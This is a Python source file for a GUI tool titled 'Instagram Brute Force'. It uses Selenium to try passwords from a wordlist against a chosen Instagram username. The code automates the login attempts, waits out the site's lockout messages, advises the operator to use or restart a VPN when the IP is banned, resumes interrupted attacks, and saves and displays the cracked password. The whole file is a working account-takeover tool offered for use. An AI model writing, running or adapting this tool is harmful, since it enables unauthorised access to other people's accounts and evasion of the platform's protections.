from tkinter import *
from PIL import Image, ImageTk
from tkinter_custom_button import TkinterCustomButton
from tkinter import filedialog
from tkinter import messagebox

stopping = 0

window = Tk()
window.title('Instagram Brute Force')
window.geometry("330x510")
window.configure(bg='black') 

image= Image.open('logo.png')
load = image.resize((170, 250), Image.ANTIALIAS)
render = ImageTk.PhotoImage(load)
img = Label(window, image=render)
img.configure(bg='black') 
img.place(x=80, y=10)

user_name = Label(window, text = "Username", width = 10)
user_name.configure(bg='black', foreground="white")
user_name.place(x = 10,y = 280)
username = Entry(window, width = 20)
username.configure(bg='black', foreground="white", highlightbackground='red')
username.place(x = 110,y = 280)

text1 = Label(window, text = "Username:", width = 25)
text1.configure(bg='black', foreground="white")
text1.place(x = 60,y = 445)

text2 = Label(window, text = "Password:", width = 25)
text2.configure(bg='black', foreground="white")
text2.place(x = 60,y = 470)

def browseFiles():
    global filename
    filename = filedialog.askopenfilename(initialdir = "/",
                                          title = "Select a File",
                                          filetypes = (("Text files",
                                                        "*.txt"),
                                                       ("all files",
                                                        "*.*")))
def setTextInput():
    username.delete(0,"end")
    username.insert(0, '')
    text1.configure(text="")
    text2.configure(text="")

def submit():
    text1.configure(text=" ")
    text2.configure(text=" ")
    s = Instagram()
    passw = s.start(username.get(), filename)

wordlist = TkinterCustomButton(text="Wordlist File", corner_radius=10, width = 110, height=30, command = browseFiles).place(x = 110,y = 325)

submit_button = TkinterCustomButton(text="Start Attacking", corner_radius=10, width = 120, height=30, command = submit).place(x = 30,y = 390)
reset_button = TkinterCustomButton(text="Clear", corner_radius=10, width = 120, height=30, command = setTextInput).place(x = 180,y = 390)


import pyarmor
# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray
import os
import time
import smtplib
import getpass
import yaml
import pickle


try:
    from bs4 import BeautifulSoup as bs
except:
    print(B + '[' + O + '*' + B + '] ' + O + "Importing BeautifulSoup - " + R + "[Error]" + W)
    exit()
time.sleep(1)
try:
    from selenium import webdriver as uc
except:
    print(B + '[' + O + '*' + B + '] ' + O + "Importing Selenium - " + R + "[Error]" + W)
    exit()
time.sleep(1)
try:
    import pandas as pd
except:
    print(B + '[' + O + '*' + B + '] ' + O + "Importing Pandas - " + R + "[Error]" + W)
    exit()
time.sleep(1)
from datetime import datetime
import signal

def signal_handler(signal, frame):
    print(B + '\n\n[' + O + '*' + B + '] ' + O + "CTRL + C" + W + " PRESSED\n")
    exit()

signal.signal(signal.SIGINT, signal_handler)

class Instagram():
    def __init__(self):
        try:
            self.chrm = 'driver/chromedriver'
        except:
            print(B + '[' + O + '*' + B + '] ' + O + "loading the drivers - " + R + "[Error]" + W)
            exit()
        self.driver = uc.Chrome(self.chrm)
        self.url = 'https://www.instagram.com/'
        self.filenm = datetime.now().strftime("%Y-%m-%d %H.%M.%S") + ".csv"

    def saveData(self, items):
        df = pd.DataFrame(items)
        df.to_csv(f'Sessions/{self.filenm}', index=False)


    def read_txt_con(self):
        try:
            old_wordlist = pickle.load(open('wordlist.dat', 'rb'))
            last = pickle.load(open('last.dat', 'rb'))
            with open('emp.txt','a') as secondfile:
                for line in old_wordlist:
                    secondfile.write(line)
            line_number = 0
            list_of_results = []
            lines = []
            i = 0
            with open('emp.txt', 'r') as read_obj:
                for line in read_obj:
                    line_number += 1
                    if last in line:
                        list_of_results.append((line_number))
                        i = list_of_results[0]
            a_file = open("emp.txt", "r")
            lines = a_file.readlines()
            a_file.close()
            i -= 1
            while i > -1:
                del lines[i]
                new_file = open("emp.txt", "w+")
                for line in lines:
                    new_file.write(line)
                new_file.close()
                i -= 1
        except:
            print(B + '[' + O + '*' + B + '] ' + R + 'The Text File Path is Wrong: ' + pw)
            self.driver.close()
            exit()

        try:
            with open("emp.txt", 'r') as f:
                paswrd = f.readlines()
                pickle.dump(paswrd, open('wordlist.dat', 'wb'))
            return paswrd
        except:
            print(B + '[' + O + '*' + B + '] ' + R + 'The Text File Path is Wrong: ' + pw)
            self.driver.close()
            exit()

    def read_txt(self, pw):
        try:
            with open(pw, 'r') as f:
                paswrd = f.readlines()
                pickle.dump(paswrd, open('wordlist.dat', 'wb'))
            return paswrd
        except:
            print(B + '[' + O + '*' + B + '] ' + R + 'The Text File Path is Wrong: ' + pw)
            self.driver.close()
            exit()

    def mkdir(self, fldr):
        try:
            os.mkdir(fldr)
        except:
            pass


    def getting_soup(self):
        return bs(self.driver.page_source, 'html.parser')


    def start(self, user, wordlist):
        self.mkdir('Sessions')
        old = ''
        try:
            old = pickle.load(open('username.dat', 'rb'))
        except:
            pass
        pickle.dump(user, open('username.dat', 'wb'))
        if old == user:
            yn = input(B + '[' + O + '*' + B + '] ' + O + "Continue last session:(Y/N) ")
            if yn == 'y' or yn == 'Y' or yn == 'Yes' or yn == 'yes':
                try:
                    passwords = self.read_txt_con()
                except:
                    print(B + '[' + O + '*' + B + '] ' + R + 'Something went wrong')
                    self.driver.close()
                    exit()
            else:
                passwords = self.read_txt(wordlist)
        else:
            passwords = self.read_txt(wordlist)
        time.sleep(2)
        os.system('clear')
        global cmp
        cmp = []
        print(B + '\n[' + O + '*' + B + '] ' + O + "Make sure that you are using VPN to protect your information")
        print(B + '[' + O + '*' + B + '] ' + O + "The session will be saved to: " + G + '/Sessions/File.csv')
        print(B + '[' + O + '*' + B + '] ' + O + "Starting the Attack on: " + G + user)
        for passwrd in passwords:
            pickle.dump(passwrd, open('last.dat', 'wb'))
            if len(passwrd) >= 8:
                password = ''.join(passwrd.split())
                self.driver.get(self.url)
                time.sleep(2)
                self.login(password, user)
                time.sleep(2)
                print(B + '\n[' + O + '*' + B + '] ' + O + '--------------------------------------------------- ' + B + '[' + O + '*' + B + ']')
                print()
                print(B + '[' + O + '*' + B + '] ' + O + 'Username ===> ' + W + f'{user}')
                print(B + '[' + O + '*' + B + '] ' + O + 'Password ===> ' + W + f'{password}', end = "\r")
                soup = self.getting_soup()
                msg = self.parse_resp(soup)
                fnl = {
                    'Passwords':password,
                    'Message':msg
                }
                cmp.append(fnl)
                self.saveData(cmp)
                check = self.check_login(password, user)
                try:
                    self.driver.find_element_by_xpath("//input[@name='username']")
                except:
                    os.system('clear')
                    break
                print(B + '[' + O + '*' + B + '] ' + O + 'Password ===> ' + R + f'{password}')
                print(B + '[' + O + '*' + B + '] ' + O + 'Message  ===> ' + R + f'{msg}')
            else:
                continue


    def login(self, pas, usr):
        try:
            self.driver.find_element_by_xpath("//button[@class='aOOlW  bIiDR  ']").click()
        except:
            pass
        time.sleep(2)
        self.driver.find_element_by_xpath("//input[@name='username']").send_keys(usr)
        self.driver.find_element_by_xpath("//input[@name='password']").send_keys(pas)
        try:
            self.driver.find_element_by_xpath("//button[@type='submit']").click()
        except:
            pass
        time.sleep(5)
        try:
            self.driver.find_element_by_xpath("//button[contains(text(), 'Not Now')]").click()
            time.sleep(2)
        except:
            pass
        try:
            self.driver.find_element_by_xpath("//button[@class='aOOlW   HoLwm ']").click()
            time.sleep(1)
        except:
            pass


    def logout(self):
        self.driver.find_element_by_xpath("//span[@class='_2dbep qNELH']").click()
        self.driver.find_element_by_xpath("//div[contains(text(), 'Log Out')]").click()
        time.sleep(2)

    def wait_element(self, xpath):
        try:
            self.driver.find_element_by_xpath(xpath)
        except:
            time.sleep(2)
            self.wait_element(xpath)

    def check_login(self, password, user):
        time.sleep(2)
        try:
            chk = self.driver.find_element_by_xpath("//p[@id='slfErrorAlert']").text.strip()
        except:
            chk = ''

        #1
        if chk == 'Sorry, your password was incorrect. Please double-check your password.':
            return 'No'
        elif chk == 'There was a problem logging you into Instagram. Please try again soon.':
            chk99 = self.waitinglast()

            if chk99 == 'Sorry, your password was incorrect. Please double-check your password.':
                return 'No'
            elif chk99 == 'There was a problem logging you into Instagram. Please try again soon.':
                chk88 = self.waitinglast()
            elif chk99 == 'Please wait a few minutes before you try again.':
                chk1 = self.waiting1()
            else:
                self.sucess(password, user)

        elif chk == "The username you entered doesn't belong to an account. Please check your username and try again.":
            self.driver.close()
            print(B + '[' + O + '*' + B + '] ' + R + 'You have entered wrong username!!!\n' + W)
            input(B + '[' + O + '*' + B + '] ' + R + 'Change the username')
        elif chk == 'Please wait a few minutes before you try again.':
            soup = self.getting_soup()
            msg = self.parse_resp(soup)
            print(B + '[' + O + '*' + B + '] ' + O + 'Password ===> ' + W + f'{password}')
            print(B + '[' + O + '*' + B + '] ' + O + 'Message  ===> ' + R + f'{msg}')
            t = 300
            while t:
                mins, secs = divmod(t, 60)
                timer = '{:02d}:{:02d}'.format(mins, secs)
                print(B + '[' + O + '*' + B + '] ' + O + 'waiting for 5 minutes - [' + W + timer + O + ']', end="\r")
                time.sleep(1)
                t -= 1
            try:
                self.driver.find_element_by_xpath("//button[@type='submit']").click()
            except:
                pass
            time.sleep(3)
            try:
                chk0 = self.driver.find_element_by_xpath("//p[@id='slfErrorAlert']").text.strip()
            except:
                chk0 = ''
            time.sleep(2)

            #2
            if chk0 == 'Sorry, your password was incorrect. Please double-check your password.':
                return 'No'
            elif chk0 == 'There was a problem logging you into Instagram. Please try again soon.':
                print(B + '[' + O + '*' + B + '] ' + R + 'Something went wrong')
                self.driver.close()
                exit()
            elif chk0 == 'Please wait a few minutes before you try again.':
                chk1 = self.waiting1()

                #3
                if chk1 == 'Sorry, your password was incorrect. Please double-check your password.':
                    return 'No'
                elif chk1 == 'There was a problem logging you into Instagram. Please try again soon.':
                    print(B + '[' + O + '*' + B + '] ' + R + 'Something went wrong')
                    self.driver.close()
                    exit()
                elif chk1 == 'Please wait a few minutes before you try again.':
                    chk2 = self.waiting2()

                    #4
                    if chk2 == 'Sorry, your password was incorrect. Please double-check your password.':
                        return 'No'
                    elif chk0 == 'There was a problem logging you into Instagram. Please try again soon.':
                        print(B + '[' + O + '*' + B + '] ' + R + 'Something went wrong')
                        self.driver.close()
                        exit()
                    elif chk2 == 'Please wait a few minutes before you try again.':
                        chk2 = self.waiting2()

                        #5
                        if chk2 == 'Sorry, your password was incorrect. Please double-check your password.':
                            return 'No'
                        elif chk2 == 'Please wait a few minutes before you try again.':
                            print(B + '[' + O + '*' + B + '] ' + R + 'Something went wrong')
                            self.driver.close()
                            exit()
                        else:
                            self.sucess(password, user)
                    else:
                        self.sucess(password, user)
                else:
                    self.sucess(password, user)
            else:
                self.sucess(password, user)
        else:
            self.sucess(password, user)

    def parse_resp(self, soup):
        try:
            msg = soup.find('p', id='slfErrorAlert').text.strip()
        except:
            msg = ''
        return msg

    def waiting1(self):
        soup = self.getting_soup()
        msg = self.parse_resp(soup)
        t = 300
        while t:
            mins, secs = divmod(t, 60)
            timer = '{:02d}:{:02d}'.format(mins, secs)
            print(B + '[' + O + '*' + B + '] ' + O + 'Adding 5 minutes more - [' + W + timer + O + ']', end="\r")
            time.sleep(1)
            t -= 1
        try:
            self.driver.find_element_by_xpath("//button[@type='submit']").click()
        except:
            pass
        time.sleep(3)
        try:
            chk1 = self.driver.find_element_by_xpath("//p[@id='slfErrorAlert']").text.strip()
        except:
            chk1 = ''
        time.sleep(2)
        return chk1

    def waiting2(self):
        soup = self.getting_soup()
        msg = self.parse_resp(soup)
        t = 600
        while t:
            mins, secs = divmod(t, 60)
            timer = '{:02d}:{:02d}'.format(mins, secs)
            print(B + '[' + O + '*' + B + '] ' + O + 'Adding 10 minutes more - [' + W + timer + O + ']', end="\r")
            time.sleep(1)
            t -= 1
        try:
            self.driver.find_element_by_xpath("//button[@type='submit']").click()
        except:
            pass
        time.sleep(3)
        try:
            chk1 = self.driver.find_element_by_xpath("//p[@id='slfErrorAlert']").text.strip()
        except:
            chk1 = ''
        time.sleep(2)
        return chk1


    def waitinglast(self):
        soup = self.getting_soup()
        msg = self.parse_resp(soup)
        print(B + '[' + O + '*' + B + '] ' + O + "Your IP has been banned, Please restart your VPN")
        t = 600
        while t:
            mins, secs = divmod(t, 60)
            timer = '{:02d}:{:02d}'.format(mins, secs)
            print(B + '[' + O + '*' + B + '] ' + O + 'Waiting for 10 minutes - [' + W + timer + O + ']', end="\r")
            time.sleep(1)
            t -= 1
        try:
            self.driver.find_element_by_xpath("//button[@type='submit']").click()
        except:
            pass
        time.sleep(3)
        try:
            chk1 = self.driver.find_element_by_xpath("//p[@id='slfErrorAlert']").text.strip()
        except:
            chk1 = ''
        time.sleep(2)
        return chk1

    def sucess(self, password, user):
        print(B + '[' + O + '*' + B + '] ' + O + 'Password ===> ' + G + f'{password}')
        self.wait_element("//span[@class='_2dbep qNELH']")
        print(B + '\n[' + O + '*' + B + '] ' + G + 'Password Found!!!')
        print(B + '[' + O + '*' + B + '] ' + O + 'Username: ' + G + f'{user}' + B + '\n[' + O + '*' + B + '] ' + O + 'Password: ' + G + f'{password}')
        soup = self.getting_soup()
        msg = self.parse_resp(soup)
        fnl = {
            'Passwords':password,
            'Message':'This is the password'
        }
        cmp.append(fnl)
        self.saveData(cmp)
        self.driver.close()
        dvuser = getpass.getuser()
        print(B + '[' + O + '*' + B + '] ' + G + 'Password saved to ' + G + 'Sessions Directory')
        messagebox.showinfo("Password Found", 'Password of ' + user + ' Found!!!')
        text1.configure(text = ' Username: ' + user + ' ', foreground="green")
        text2.configure(text = ' Password: ' + password + ' ', foreground="green")
      
window.mainloop() 